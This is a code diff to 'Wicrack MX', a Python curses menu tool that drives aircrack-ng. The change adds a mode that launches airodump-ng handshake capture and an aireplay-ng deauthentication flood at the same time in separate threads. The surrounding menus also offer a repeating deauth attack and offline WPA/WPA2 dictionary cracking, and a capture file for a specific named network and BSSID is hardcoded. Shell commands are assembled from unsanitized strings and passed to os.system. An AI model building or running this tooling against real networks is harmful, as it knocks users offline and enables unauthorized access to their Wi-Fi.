@@ -1,6 +1,7 @@
 from getmac import get_mac_address
 from wifi import Cell, Scheme
 import netifaces, curses, os #curses is the interface for capturing key presses on the menu, os launches the files
+import _thread
 screen = curses.initscr() #initializes a new window for capturing key presses
 curses.noecho() # Disables automatic echoing of key presses (prevents program from input each key twice)
 curses.cbreak() # Disables line buffering (runs each key as it is pressed rather than waiting for the return key to pressed)
@@ -22,6 +23,7 @@ WIFISEL = "WIFISEL" #used to generat wifi target list
 WIFIOPT = "WIFIOPT" #select wifi target
 CAPSEL = "CAPSEL" #select capture files
 DICTSEL = "DICTSEL" #select Dictionary files
+MULTICOMMAND = "MULTICOMMAND"
 
 wifilist = []
 wilist = []
@@ -36,6 +38,11 @@ target_channel = ""
 capture_file = "\"cap/AXTEL XTREMO-3E6E_62:02:71:88:3E:6F-01.cap\""
 password_list = "dictionary/axtel.txt"
 list2 = []
+
+def runcom(com, state):
+  if state:
+    os.system(com)
+  
 
 # function to refresh all interfaces availables
 def refresh_options_list2():
@@ -73,6 +80,8 @@ menu_data = {}
 def set_data():
     global menu_data
     global list2
+    airmoncommand = 'airodump-ng -c '+ target_channel + ' --bssid ' + target_BSSID + ' -w ' + 'cap/' + '\"' + target + '\"' + '_' + target_BSSID + ' ' +  selected_interface 
+    airplaycommand = 'aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface
     menu_data = {
       'title': "Wicrack MX", 'type': MENU, 'subtitle': "Selected interface: " + selected_interface + " Interface mode: " + interface_mode + " Target: " + target, 'options': [
         { 'title': "Select network interface", 'type': MENU, 'subtitle': "Selected interface: " + selected_interface, 'options': list2 },
@@ -84,7 +93,7 @@ def set_data():
           {'title': "DEAUTH", 'type': COMMAND, 'command': 'watch -n 3 sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface },
         ]},
         { 'title': "Handshake/PMKID tools menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
-          {'title': "Capture handshake with airplay", 'type': COMMAND, 'command': 'sudo airodump-ng -c '+ target_channel + ' --bssid ' + target_BSSID + ' -w ' + 'cap/' + "\"" + target + "\"" + '_' + target_BSSID + ' ' +  selected_interface + "mon\n" 'sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface },
+          {'title': "Capture handshake with airplay", 'type': MULTICOMMAND, 'command1': 'sudo xterm -geometry 120x30 -e '+ airmoncommand, 'command2': 'sudo xterm -geometry 90x30 -e ' + airplaycommand   },
         ]},
         { 'title': "Offline WPA/WPA2 cracking menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
           {'title': "Select capture file", 'type': COMMAND, 'command': ''  },
@@ -202,6 +211,24 @@ def processmenu(menu, parent = None):
       curses.curs_set(1)         # reset doesn't do this right
       curses.curs_set(0)
       os.system('echo > log ' + str(menu))
+
+    elif menu['options'][getin]['type'] == MULTICOMMAND:
+      #menu = menu_data
+      curses.def_prog_mode()    # save curent curses environment
+      os.system('reset')
+      screen.clear() #clears previous screen
+      #os.system('echo > log ' + (menu['options'][getin]['command1']))
+      com1= str(menu['options'][getin]['command1'])
+      com2= (menu['options'][getin]['command2'])
+      _thread.start_new_thread( runcom,(com1,True) )#command1
+      _thread.start_new_thread( runcom,(com2,True) )#command1
+       
+      screen.clear() #clears previous screen on key press and updates display based on pos
+      curses.reset_prog_mode()   # reset to 'current' curses environment
+      curses.curs_set(1)         # reset doesn't do this right
+      curses.curs_set(0)
+      os.system('echo > log ' + str(menu))
+
 
     elif menu['options'][getin]['type'] == MAINCOMMAND:
       #menu = menu_data
